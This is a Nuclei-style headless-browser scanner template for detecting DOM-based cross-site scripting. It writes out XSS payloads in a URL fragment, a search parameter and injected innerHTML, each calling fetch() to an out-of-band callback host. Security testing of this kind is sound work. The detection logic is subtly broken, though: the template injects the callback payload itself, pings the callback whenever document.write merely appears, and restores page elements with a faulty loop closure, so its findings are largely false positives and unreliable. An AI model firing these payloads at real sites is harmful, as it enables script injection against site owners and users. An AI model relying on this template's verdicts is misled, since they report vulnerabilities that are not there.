id: dom-xss-detection

info:
  name: DOM XSS Detection with Real Browser Execution
  author: geeknik
  severity: high
  description: |
    Detects DOM-based XSS vulnerabilities by executing JavaScript in a real
    browser context and monitoring for successful payload execution.
  reference:
    - https://owasp.org/www-community/attacks/xss/
    - https://portswigger.net/web-security/cross-site-scripting/dom-based
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
  tags: xss,dom,headless,injection

variables:
  xss_id: "{{randstr}}"
  callback: "{{interactsh-url}}"

headless:
  - steps:
      - action: navigate
        args:
          url: "{{BaseURL}}"

      - action: waitload

      # Test 1: URL fragment XSS
      - action: navigate
        args:
          url: "{{BaseURL}}#<img src=x onerror=fetch('{{callback}}/fragment-{{xss_id}}')>"

      - action: waitload

      # Test 2: Search parameter XSS
      - action: navigate
        args:
          url: "{{BaseURL}}?search=<script>fetch('{{callback}}/search-{{xss_id}}')</script>"

      - action: waitload

      # Test 3: DOM manipulation via innerHTML
      - action: script
        args:
          code: |
            // Find all elements that use innerHTML
            var elements = document.querySelectorAll('[id], [class]');
            for(var i=0; i<elements.length && i<10; i++) {
              try {
                var original = elements[i].innerHTML;
                elements[i].innerHTML = "<img src=x onerror=\"fetch('{{callback}}/innerhtml-{{xss_id}}')\">";
                // Restore to not break the page
                setTimeout(() => { elements[i].innerHTML = original; }, 100);
              } catch(e) {}
            }

      - action: wait
        args:
          duration: 2

      # Test 4: Check for unsafe DOM sinks
      - action: script
        args:
          code: |
            // Check for vulnerable patterns
            var vulns = [];

            // Check for eval usage
            if(window.eval.toString().indexOf('[native code]') === -1) {
              vulns.push('eval-overridden');
            }

            // Check for document.write
            var scripts = document.getElementsByTagName('script');
            for(var i=0; i<scripts.length; i++) {
              if(scripts[i].innerHTML.includes('document.write')) {
                vulns.push('document-write-found');
                fetch('{{callback}}/docwrite-{{xss_id}}');
              }
            }

            // Check for location manipulation
            if(location.href.includes('<') || location.hash.includes('<')) {
              vulns.push('location-injectable');
              fetch('{{callback}}/location-{{xss_id}}');
            }

            window.vulns = vulns;

      - action: extract
        args:
          name: vulnerabilities
          script: "window.vulns || []"

    matchers-condition: or
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
          - "dns"

      - type: word
        part: extract
        name: vulnerabilities
        words:
          - "eval-overridden"
          - "document-write-found"
          - "location-injectable"
        condition: or

    extractors:
      - type: regex
        part: interactsh_request
        regex:
          - '/(fragment|search|innerhtml|docwrite|location)-[a-z0-9]+'
        group: 0